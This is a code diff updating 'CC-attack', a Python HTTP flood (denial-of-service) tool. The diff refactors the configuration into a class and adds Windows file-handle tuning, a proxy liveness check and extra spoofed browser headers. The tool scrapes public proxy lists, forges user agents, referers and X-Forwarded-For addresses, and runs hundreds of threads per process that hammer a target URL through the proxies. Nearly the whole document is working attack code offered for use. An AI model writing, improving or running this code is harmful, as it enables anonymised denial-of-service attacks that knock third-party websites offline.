@@ -10,10 +10,17 @@ import random
 import ssl
 import sys
 import string
-#import socket
+import socket
 import os
 import time
 import requests
+
+try:
+	import win32file
+	win32file._setmaxstdio(8192)
+	#print("Set")
+except:
+	pass
 
 try:
 	import socks
@@ -24,77 +31,78 @@ except:
 #############################
 #         variables         #
 #############################
-global_vars = {#Share it in multiprocessing, and set default values
-	"Method":"get",
-	"Target_url":"",
-	"Proxy_type":5,# 0 for http, 4 for socks4, 5 for socks5
-	"Thread_num":400,
-	"Process_num":1,
-	"Payload":"",
-	"Cookies":"",
-	"Cookies_file":"",
-	"RandUrl":False,
-	"Path":"/",
-	"Timeout":5,
+class global_vars :
 
-	#untouchable stuff
-	"Proxies_list":[],
-	"Protocol": "",
-	"Target":"",
-	"Port":0,
-	"ascii_letters":string.ascii_letters,
-	"digits":string.digits,
+	def __init__(self) -> None:
+		self.method = "get"
+		self.target_url = ""
+		self.proxy_type = 5
+		self.threads_num = 400
+		self.process_num = 1
+		self.payload = ""
+		self.cookies = ""
+		self.cookies_file = ""
+		self.randurl = False
+		self.path = "/"
+		self.timeout = 5
 
-	"acceptall": [
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept-Encoding: gzip, deflate\r\n",
-		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
-		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xhtml+xml",
-		"Accept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
-		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",],
+		self.proxies_list = []
+		self.protocol = ""
+		self.target = ""
+		self.port = 0
 
-	"referers" : [
-		"https://www.google.com/search?q=",
-		"https://check-host.net/",
-		"https://www.facebook.com/",
-		"https://www.youtube.com/",
-		"https://www.fbi.com/",
-		"https://www.bing.com/search?q=",
-		"https://r.search.yahoo.com/",
-		"https://www.cia.gov/index.html",
-		"https://vk.com/profile.php?redirect=",
-		"https://www.usatoday.com/search/results?q=",
-		"https://help.baidu.com/searchResult?keywords=",
-		"https://steamcommunity.com/market/search?q=",
-		"https://www.ted.com/search?q=",
-		"https://play.google.com/store/search?q=",
-		"https://www.qwant.com/search?q=",
-		"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
-		"https://www.google.ad/search?q=",
-		"https://www.google.ae/search?q=",
-		"https://www.google.com.af/search?q=",
-		"https://www.google.com.ag/search?q=",
-		"https://www.google.com.ai/search?q=",
-		"https://www.google.al/search?q=",
-		"https://www.google.am/search?q=",
-		"https://www.google.co.ao/search?q=",
-],
-	"Proxytype_mapping" : {
-		5: socks.SOCKS5,
-		4: socks.SOCKS4,
-		0: socks.HTTP,
-}
+		self.acceptall =  [
+			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+			"Accept-Encoding: gzip, deflate\r\n",
+			"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+			"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+			"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+			"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+			"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+			"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
+			"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
+			"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+			"Accept: text/html, application/xhtml+xml",
+			"Accept-Language: en-US,en;q=0.5\r\n",
+			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
+			"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+			]
 
-	}
+		self.referers = [
+			"https://www.google.com/search?q=",
+			"https://check-host.net/",
+			"https://www.facebook.com/",
+			"https://www.youtube.com/",
+			"https://www.fbi.com/",
+			"https://www.bing.com/search?q=",
+			"https://r.search.yahoo.com/",
+			"https://www.cia.gov/index.html",
+			"https://vk.com/profile.php?redirect=",
+			"https://www.usatoday.com/search/results?q=",
+			"https://help.baidu.com/searchResult?keywords=",
+			"https://steamcommunity.com/market/search?q=",
+			"https://www.ted.com/search?q=",
+			"https://play.google.com/store/search?q=",
+			"https://www.qwant.com/search?q=",
+			"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
+			"https://www.google.ad/search?q=",
+			"https://www.google.ae/search?q=",
+			"https://www.google.com.af/search?q=",
+			"https://www.google.com.ag/search?q=",
+			"https://www.google.com.ai/search?q=",
+			"https://www.google.al/search?q=",
+			"https://www.google.am/search?q=",
+			"https://www.google.co.ao/search?q=",
+			]
+
+		self.proxytype_mapping ={
+			5: socks.SOCKS5,
+			4: socks.SOCKS4,
+			0: socks.HTTP,
+		}
+
+
 
 #################################
 #          Misc stuff          #
@@ -132,27 +140,27 @@ def getuseragent():
 	user_agent = f"Mozilla/5.0 ({operating_system} {random.randint(1, 10)}.0; {random.choice(['Win64', 'x64'])}) AppleWebKit/537.36 (KHTML, like Gecko) {browser_name}/{random.randint(50, 99)}.0.{random.randint(1000, 9999)} Safari/537.36"
 	return user_agent
 
-def RandomString(vars):
+def RandomString():
 	pattern = random.randint(0,3)
 	if pattern == 0:
-		return generate_random_string("s"*10+"d"*10+"S"*10,vars)
+		return generate_random_string("s"*10+"d"*10+"S"*10)
 	if pattern == 1:
-		return generate_random_string("S"*5+"s"*5+"S"*5+"d"*15,vars)
+		return generate_random_string("S"*5+"s"*5+"S"*5+"d"*15)
 	if pattern == 2:
-		return generate_random_string("d"*5+"s"*10+"S"*10+"d"*5,vars)
+		return generate_random_string("d"*5+"s"*10+"S"*10+"d"*5)
 	if pattern == 3:
-		return generate_random_string("d"*20+"s"*5+"S"*5,vars)
+		return generate_random_string("d"*20+"s"*5+"S"*5)
 
-def generate_random_string(pattern,vars):
+def generate_random_string(pattern):
 	# Generate a random string of the specified pattern
 	random_string = ""
 	for ch in pattern:
 		if ch == "s":
 			# Generate a random lowercase letter
-			random_string += random.choice(vars["ascii_letters"][:26])
+			random_string += random.choice(string.ascii_letters[:26])
 		elif ch == "S":
 			# Generate a random uppercase letter
-			random_string += random.choice(vars["ascii_letters"][26:])
+			random_string += random.choice(string.ascii_letters[26:])
 		elif ch == "d":
 			# Generate a random digit
 			random_string += random.choice(string.digits)
@@ -163,13 +171,13 @@ def generate_random_string(pattern,vars):
 
 def build_threads(vars,events):
 	# Create a thread to run the HTTP flood function
-	for _ in range(vars["Thread_num"]):
+	for _ in range(vars.threads_num):
 		threading.Thread(target=CC_ATTACK, args=(vars,events,)).start()
 
 def build_processes(vars,events):
-	if vars["Process_num"] < 1:
+	if vars.process_num < 1:
 		print("Invaild Process numbers.(At least 1 process)")
-	for _ in range(vars["Process_num"]):
+	for _ in range(vars.process_num):
 		multiprocessing.Process(target=build_threads, args=(vars,events,),daemon=True).start()
 
 def check_list(proxy_file):
@@ -193,50 +201,61 @@ def GenFakeIp():
 	return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
 
 def PreGenRequest(vars):
-	request =  vars["Method"].upper() + " " + vars["Path"] + "{url_arg}  HTTP/1.1\r\n"
-	request += "Host: "+vars["Target"]+":"+str(vars["Port"])+"\r\n"
+	path_parts = vars.path.partition("?")
+	add = "&" if path_parts[1] else "?"
+	request =  vars.method.upper() + " " + vars.path + "{url_arg}  HTTP/1.1\r\n".format(url_arg=add+"{url_arg}" if vars.randurl else "")
+	request += "Host: "+vars.target+":"+str(vars.port)+"\r\n"
 	request += "User-Agent: " + getuseragent() + "\r\n"
-	if vars["Cookies"] != "":
-		request += "Cookies: "+vars["Cookies"]+"\r\n"
-	request += random.choice(vars["acceptall"])
+
+	if vars.cookies != "":
+		request += "Cookies: "+vars.cookies+"\r\n"
+
+	request += random.choice(vars.acceptall)
 	request += "Connection: Keep-Alive\r\n"
 	request += "Cache-Control: no-cache\r\n"
 	request += "Upgrade-Insecure-Requests: 1\r\n"
+	request += "Sec-Fetch-Dest: document\r\n"
+	request += "Sec-Fetch-Mode: navigate\r\n"
+	request += "Sec-Fetch-Site: none\r\n"
+	request += "Sec-Fetch-User: ?1\r\n"
+
 	fakeip = GenFakeIp()
 	request += "Via: " + fakeip + "\r\n"
 	request += "Client:" + fakeip + "\r\n"
 	request += "Client-IP:" + fakeip + "\r\n"
 	request += "X-Forwarded-For:" + fakeip + "\r\n"
-	if vars["Method"] != "post":
-		request += "Referer: "+random.choice(vars["referers"])+vars["Target"]+"\r\n"
+	request += "X-Forwarded-Proto: http\r\n"
+
+	if vars.method != "post":
+		request += "Referer: "+random.choice(vars.referers)+vars.target+"\r\n"
 		request+= "\r\n"
 	else:
-		request += "Referer: "+vars["Protocol"]+"://"+vars["Target"]+"\r\n"
+		request += "Referer: "+vars.protocol+"://"+vars.target+"\r\n"
 		request += "Content-Type: text/html; charset=utf-8\r\n"
 		request += "Content-Legnth: {payload_len}\r\n"
 		request += "\r\n{payload}"
-	# Debug the request
-	#print(request)
+
 	return request
 
 def PrintHelp():
-	print('''===============  CC-attack help list  ===============
-   -h/help   | showing this message
-   -url      | set target url
-   -m/method | set HTTP Method(GET/POST/HEAD, default:GET)
-   -data     | set post data path (only works on post method)
-			 | (Example: -data data.txt)
-   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
-   -v        | set proxy type (4/5/http, default:5)
-   -f        | set proxies file (default:proxy.txt)
-   -s        | set attack time(default:60)
-   -tt       | set threads number (default:400)
-   -tp       | set process number (default:1)
-   -timeout  | set timeout (default:5)
-   -rand     | enable random url/post data
-   -down     | download proxies
-   -check    | check proxies
-=====================================================''')
+	print('''
+┌─────────────┬───── CC-attack help list  ───────────────────┐
+│   -h/help   │ showing this message                         │
+│   -url      │ set target url                               │
+│   -m/method │ set HTTP Method(GET/POST/HEAD, default:GET)  │
+│   -data     │ set post data path                           │
+│             │ (Example: -data data.txt)                    │
+│   -cookies  │ set cookies (Example: 'id:xxx;ua:xxx')       │
+│   -v        │ set proxy type (4/5/http, default:5)         │
+│   -f        │ set proxies file (default:proxy.txt)         │
+│   -s        │ set attack time(default:60)                  │
+│   -tt       │ set threads number per process (default:400) │
+│   -tp       │ set process number (default:1)               │
+│   -timeout  │ set timeout (default:5)                      │
+│   -rand     │ enable random url/post data                  │
+│   -down     │ download proxies                             │
+│   -check    │ check proxies                                │
+└─────────────┴──────────────────────────────────────────────┘''')
 
 #################################
 #         Proxy stuff           #
@@ -244,19 +263,18 @@ def PrintHelp():
 def download_proxies_as_list(api):
 	tmp = b''
 	try:
-		tmp = requests.get(api, timeout=5).content
+		tmp = requests.get(api, timeout=5,headers={"user-agent":getuseragent()}).content
 	except ConnectionError:
 		# Retry request after a short delay
 		time.sleep(0.5)
-		tmp = requests.get(api, timeout=5).content
+		tmp = requests.get(api, timeout=5,headers={"user-agent":getuseragent()}).content
 	except:
 		pass
 	return tmp
 
 def download_proxies(vars, out_file):
-	proxy_type = vars["Proxy_type"]
 	api_list = set()
-	if proxy_type == 4:
+	if vars.proxy_type == 4:
 		api_list = [
 			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
 			"https://openproxylist.xyz/socks4.txt",
@@ -272,7 +290,7 @@ def download_proxies(vars, out_file):
 			"https://www.proxyscan.io/download?type=socks4",
 			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
 			"https://api.openproxylist.xyz/socks4.txt",]
-	elif proxy_type == 5:
+	elif vars.proxy_type == 5:
 		api_list = [
 			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
 			"https://www.proxy-list.download/api/v1/get?type=socks5",
@@ -290,8 +308,9 @@ def download_proxies(vars, out_file):
 			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
 			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
 			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",]
-	elif proxy_type == 0:
-		api_list = ["https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
+	elif vars.proxy_type == 0:
+		api_list = [
+			"https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
 			"https://www.proxy-list.download/api/v1/get?type=http",
 			"https://www.proxyscan.io/download?type=http",
 			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
@@ -336,14 +355,14 @@ def download_proxies(vars, out_file):
 			for task in concurrent.futures.as_completed(task_list):
 				data = task.result()
 				f.write(data)
-	if proxy_type == 4:
+	if vars.proxy_type == 4:
 		socks_proxy_net(out_file)
 	check_list(out_file)
 	print("> Have already downloaded proxies list as "+out_file)
 
 def socks_proxy_net(out_file):
 	try:
-		r = requests.get("https://www.socks-proxy.net/",timeout=5)
+		r = requests.get("https://www.socks-proxy.net/",timeout=5,headers={"user-agent":getuseragent()})
 		part = str(r.content)
 		part = part.split("<tbody>")
 		part = part[1].split("</tbody>")
@@ -372,23 +391,35 @@ def ProxiesChecker(input_list,proxy_type,target_url,timeout):
 	good = set()
 	with concurrent.futures.ThreadPoolExecutor(max_workers=800) as executor:#Super Fast Proxies Checker, LOL
 		print("> Checking proxies' availability")
-		task_list = {executor.submit(CheckingProxy,target_url,proxy_type_dict[proxy_type],proxy,timeout): proxy for proxy in input_list}
+		task_list = {executor.submit(CheckingProxy,target_url,proxy_type_dict[proxy_type],proxy.strip(),timeout): proxy for proxy in input_list}
 		for task in concurrent.futures.as_completed(task_list):
-			result = task.result()
-			#print(result) # debug
-			if str(result) != "error":
-				if str(result) not in good:
-					good.add(str(result))
+			try:
+				result = task.result()
+				#print(result) # debug
+				if "error" not in str(result):
+					if str(result) not in good:
+						good.add(str(result))
+			except:
+				pass
 	return good
 
 def CheckingProxy(url,proxy_type,proxy,timeout):
+	try:# Check the proxy is alive at first, it should be saved some time
+		proxy_splited = proxy.split(":")
+		s = socket.socket()
+		s.settimeout(timeout)
+		s.connect((proxy_splited[0],int(proxy_splited[1])))
+		s.close()
+	except:
+		return "error 1"
 	try:
-		requests.get(url,proxies={'http': proxy_type+proxy.strip(),'https':proxy_type+proxy.strip()},timeout=timeout)
+		r = requests.get(url,proxies={'http': proxy_type+proxy ,'https':proxy_type+proxy},timeout=timeout,headers={"user-agent":getuseragent()})
 		return proxy
 	except requests.exceptions.Timeout:
-		return "error"
+		return "error 2"
 	except:
-		return "error"
+		return proxy
+		
 	
 
 #################################
@@ -396,72 +427,61 @@ def CheckingProxy(url,proxy_type,proxy,timeout):
 #################################
 def CC_ATTACK(vars,event):
 	# Split the proxy string into host and port
-	proxy = random.choice(vars["Proxies_list"]).strip().split(":")
+	proxy = random.choice(vars.proxies_list).strip().split(":")
+
+	ctx = ssl.create_default_context()
+	ctx.check_hostname = False
+	ctx.verify_mode = ssl.CERT_NONE
 
 	# Generate the request
-	pre_request = PreGenRequest(vars)
-	#Find out which character need to use
-	path_parts = vars["Path"].partition("?")
-	add = "&" if path_parts[1] else "?"
-	if (vars["RandUrl"])==True:
-		pre_request = pre_request.format(url_arg=add+"{url_arg}")
-	else:
-		pre_request = pre_request.format(url_arg="")
+	pre_request= PreGenRequest(vars)
 	request = pre_request
+
 	# Wait signal
 	event.wait()
+
 	# Keep sending requests until interrupted
+	
 	while True:
 		try:
 			# Create a socket and set the proxy and timeout
 			s = socks.socksocket()
-			s.set_proxy(vars["Proxytype_mapping"][vars["Proxy_type"]], str(proxy[0]), int(proxy[1]))
-			s.settimeout(vars["Timeout"])
-
+			s.set_proxy(vars.proxytype_mapping[vars.proxy_type], str(proxy[0]), int(proxy[1]))
+			s.settimeout(vars.timeout)
 			# Connect to the target
-			s.connect((vars["Target"], vars["Port"]))
+			s.connect((vars.target, vars.port))
 
 			# If using HTTPS, wrap the socket in an SSL context
-			if vars["Protocol"] == "https":
-				ctx = ssl.create_default_context()
-				ctx.check_hostname = False
-				ctx.verify_Method = ssl.CERT_NONE
+			if vars.protocol == "https":
 				s = ctx.wrap_socket(s)
 
-			# Send 100 requests
-			for _ in range(100):
+			# Send 64 requests
+			for _ in range(64):
 				# Use a random URL if specified
-				if vars["RandUrl"]:
-					request = pre_request.format(url_arg=RandomString(vars))
+				if vars.randurl:
+					request = pre_request.format(url_arg=RandomString())
 
 				# Use a random payload if specified
-				if vars["Method"] == "post":
-					if vars["Payload"] != "":
-						request = pre_request.format(payload=vars["Payload"],payload_len=len(vars["Payload"]))
+				if vars.method == "post":
+					if vars.payload != "":
+						request = pre_request.format(payload=vars.payload,payload_len=len(vars.payload))
 					else:
-						data = RandomString(vars)
-						request = pre_request.format(payload=data,payload_len=len(data))
+						data = RandomString()
+						request = pre_request.format(payload=data,payload_len=len(str(data)))
 
 				# Debug
 				# print(request)
 
 				# Send the request
-				s.send(str.encode(request))
-				s.settimeout(1)
+				s.sendall(str.encode(request))
+				s.settimeout(2)
 			# Close the socket (maybe not close will get better result?)
 			#s.shutdown(2)
 			#s.close()
 		except:
 			# Generate again, same as the initial action
-			proxy = random.choice(vars["Proxies_list"]).strip().split(":")
-			pre_request = PreGenRequest(vars)
-			path_parts = vars["Path"].partition("?")
-			add = "&" if path_parts[1] else "?"
-			if (vars["RandUrl"])==True:
-				pre_request = pre_request.format(url_arg=add+"{url_arg}")
-			else:
-				pre_request = pre_request.format(url_arg="")
-			request = pre_request
+			proxy = random.choice(vars.proxies_list).strip().split(":")
+			request= PreGenRequest(vars)
 			# Ignore any errors and keep sending requests
 			pass
 
@@ -491,7 +511,7 @@ def ParseUrl(original_url,vars):
 	# Strip leading/trailing white space from the original URL
 	original_url = original_url.strip()
 	# Save it
-	vars["Target_url"] = original_url
+	vars.target_url = original_url
 	# Parse the protocol (default to "http")
 	protocol = "http"
 	if original_url.startswith("https://"):
@@ -504,10 +524,10 @@ def ParseUrl(original_url,vars):
 	path = "/" + "/".join(port_and_path) if port_and_path else "/"
 
 	# set the parsed components of the URL
-	vars["Protocol"] = protocol
-	vars["Target"] = target
-	vars["Port"] =  port
-	vars["Path"] = path
+	vars.protocol = protocol
+	vars.target = target
+	vars.port =  port
+	vars.path = path
 
 	# It should need to be return...
 	# but i don't know what it works 
@@ -567,7 +587,8 @@ def oldcli(vars):
 '''
 def main():
 	#Initial those "global" varibles
-	vars = global_vars
+	vars = global_vars()
+
 	help = False
 	download = False
 	check_proxies = False
@@ -581,42 +602,42 @@ def main():
 		if args=="-url":
 			vars = ParseUrl(sys.argv[n+1],vars)
 		if args=="-m" or args=="-method":
-			vars["Method"] = sys.argv[n+1]
-			if vars["Method"] not in ["get","post","head"]:#,"slow"]:
+			vars.method = sys.argv[n+1]
+			if vars.method not in ["get","post","head"]:#,"slow"]:
 				print("> -m/-method argument error")
 				return
 		if args =="-v":
 			ver= sys.argv[n+1]
 			if ver == "4":
-				vars["Proxy_type"] = 4
+				vars.proxy_type = 4
 			elif ver == "5":
-				vars["Proxy_type"] = 5
+				vars.proxy_type = 5
 			elif ver == "http":
-				vars["Proxy_type"] = 0
+				vars.proxy_type = 0
 			elif ver not in ["4","5","http"]:
 				print("> -v argument error (only 4/5/http)")
 				return
 		if args == "-tt":
 			try:
-				vars["Thread_num"] = int(sys.argv[n+1])
+				vars.threads_num = int(sys.argv[n+1])
 			except:
 				print("> -tt must be positive integer")
 				return
 		if args == "-tp":
 			try:
-				vars["Process_num"] = int(sys.argv[n+1])
+				vars.process_num = int(sys.argv[n+1])
 			except:
 				print("> -tp must be positive integer")
 				return
 		if args == "-cookies":
-			vars["Cookies"] = sys.argv[n+1]
+			vars.cookies = sys.argv[n+1]
 		if args == "-data":
 			data = open(sys.argv[n+1],"r",encoding="utf-8", errors='ignore').readlines()
-			vars["Payload"] = ' '.join([str(txt) for txt in data])
+			vars.payload = ' '.join([str(txt) for txt in data])
 		if args == "-f":
 			proxy_file = sys.argv[n+1]
 		if args == "-rand":
-			vars["RandUrl"] = True
+			vars.randurl = True
 		if args == "-down":
 			download=True
 		if args == "-check":
@@ -629,11 +650,12 @@ def main():
 				return
 		if args == "-timeout":
 			try:
-				vars["Timeout"] = float(sys.argv[n+1])
+				vars.timeout = float(sys.argv[n+1])
 			except:
-				print("timeout should be positive number")
+				print("> Timeout should be positive number")
+				return
 
-	if help:
+	if help or ( vars.target == "" and (download == False or check_proxies == False)):
 		PrintHelp()
 		return
 
@@ -646,23 +668,23 @@ def main():
 		print("Proxies file not found")
 		return
 
-	vars["Proxies_list"] = open(proxy_file).readlines()
+	vars.proxies_list = open(proxy_file).readlines()
 	
 	if check_proxies:
-		vars["Proxies_list"] = list(ProxiesChecker(vars["Proxies_list"],vars["Proxy_type"],vars["Target_url"],vars["Timeout"]))
+		vars.proxies_list = list(ProxiesChecker(vars.proxies_list,vars.proxy_type,vars.target_url,vars.timeout))
 		with open(proxy_file, "w") as f:
-			for line in vars["Proxies_list"]:
-				f.write(line)
+			for line in vars.proxies_list:
+				f.write(line+"\r\n")
 		# Double check
 		check_list(proxy_file)
-		vars["Proxies_list"] = open(proxy_file).readlines()	
+		vars.proxies_list = open(proxy_file).readlines()	
 	
-	if len(vars["Proxies_list"]) == 0:
+	if len(vars.proxies_list) == 0:
 		print("> There are no more proxies. Please download a new proxies list.")
 		return
-	print ("> Number Of Proxies: %d" %(len(vars["Proxies_list"])))
+	print ("> Number Of Proxies: %d" %(len(vars.proxies_list)))
 	
-	if vars["Target"] == "" or vars["Target_url"] == "":
+	if vars.target == "" or vars.target_url == "":
 		print("> There is no target. End of process ")
 		return
 	'''
